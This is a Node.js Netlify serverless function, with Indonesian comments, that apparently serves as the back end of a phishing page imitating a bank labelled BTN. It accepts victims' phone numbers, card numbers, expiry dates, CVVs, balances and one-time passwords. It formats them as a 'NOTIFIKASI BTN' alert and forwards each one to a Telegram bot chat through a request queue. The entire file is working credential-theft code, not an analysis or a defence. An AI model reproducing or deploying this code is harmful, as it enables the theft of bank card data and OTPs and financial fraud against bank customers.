// netlify/functions/send-data.js
const fetch = require('node-fetch');

// Queue system untuk menangani banyak request
let requestQueue = [];
let isProcessing = false;

// Fungsi untuk delay (ms)
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Fungsi untuk memformat pesan sesuai permintaan
function formatMessage(data) {
    const lines = [];
    
    // Header
    lines.push('┌─  NOTIFIKASI BTN');
    lines.push('├───────────────────');
    
    // Data sesuai yang tersedia
    if (data.phoneNumber) {
        lines.push(`├─  NO HP : ${data.phoneNumber}`);
    }
    
    if (data.cardNumber) {
        lines.push(`├─ NO KRT : ${data.cardNumber}`);
    }
    
    if (data.expiry && data.cvv) {
        lines.push(`├─ AKTF - CCV : ${data.expiry}`);
    } else if (data.expiry) {
        lines.push(`├─ AKTF : ${data.expiry}`);
    } else if (data.cvv) {
        lines.push(`├─ CCV : ${data.cvv}`);
    }
    
    if (data.saldo) {
        lines.push(`├─ SALDO : Rp ${data.saldo}`);
    }
    
    if (data.otp) {
        lines.push(`├─ OTP : ${data.otp}`);
    }
    
    // Footer
    lines.push('╰───────────────────');
    lines.push('');
    lines.push(`⏰ Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`);
    
    return lines.join('\n');
}

// Fungsi untuk mengirim pesan ke Telegram
async function sendToTelegram(botToken, chatId, message) {
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        })
    });
    
    return await response.json();
}

// Proses antrian
async function processQueue(botToken, chatId) {
    if (isProcessing || requestQueue.length === 0) return;
    
    isProcessing = true;
    
    while (requestQueue.length > 0) {
        const request = requestQueue.shift();
        try {
            const message = formatMessage(request.data);
            await sendToTelegram(botToken, chatId, message);
            
            // Kirim response sukses ke client
            if (request.response) {
                request.response.statusCode = 200;
                request.response.body = JSON.stringify({ 
                    success: true, 
                    message: 'Data berhasil dikirim',
                    step: request.data.step 
                });
            }
            
            // Delay 500ms antar pengiriman untuk menghindari rate limit
            await delay(500);
            
        } catch (error) {
            console.error('Error processing queue item:', error);
            if (request.response) {
                request.response.statusCode = 500;
                request.response.body = JSON.stringify({ 
                    success: false, 
                    error: error.message,
                    step: request.data.step 
                });
            }
        }
    }
    
    isProcessing = false;
}

exports.handler = async (event, context) => {
    // Hanya menerima method POST
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method not allowed' })
        };
    }

    try {
        // Ambil token dari environment variable
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!BOT_TOKEN || !CHAT_ID) {
            console.error('Environment variables not set');
            return {
                statusCode: 500,
                body: JSON.stringify({ 
                    error: 'Server configuration error',
                    message: 'Bot token atau chat ID tidak ditemukan'
                })
            };
        }

        // Parse data yang dikirim dari frontend
        const data = JSON.parse(event.body);
        
        // Validasi data minimal harus ada salah satu field
        if (!data.phoneNumber && !data.cardNumber && !data.expiry && !data.cvv && !data.saldo && !data.otp) {
            return {
                statusCode: 400,
                body: JSON.stringify({ 
                    error: 'Invalid data',
                    message: 'Tidak ada data yang dikirim'
                })
            };
        }

        // Tambahkan ke antrian
        const responseObj = {
            statusCode: 200,
            body: null
        };
        
        requestQueue.push({
            data: data,
            response: responseObj,
            timestamp: Date.now()
        });
        
        // Proses antrian
        await processQueue(BOT_TOKEN, CHAT_ID);
        
        // Kembalikan response
        if (responseObj.body) {
            return {
                statusCode: responseObj.statusCode,
                body: responseObj.body
            };
        }
        
        return {
            statusCode: 200,
            body: JSON.stringify({ 
                success: true, 
                message: 'Data ditambahkan ke antrian',
                queueLength: requestQueue.length
            })
        };

    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                error: 'Internal server error',
                message: error.message 
            })
        };
    }
};
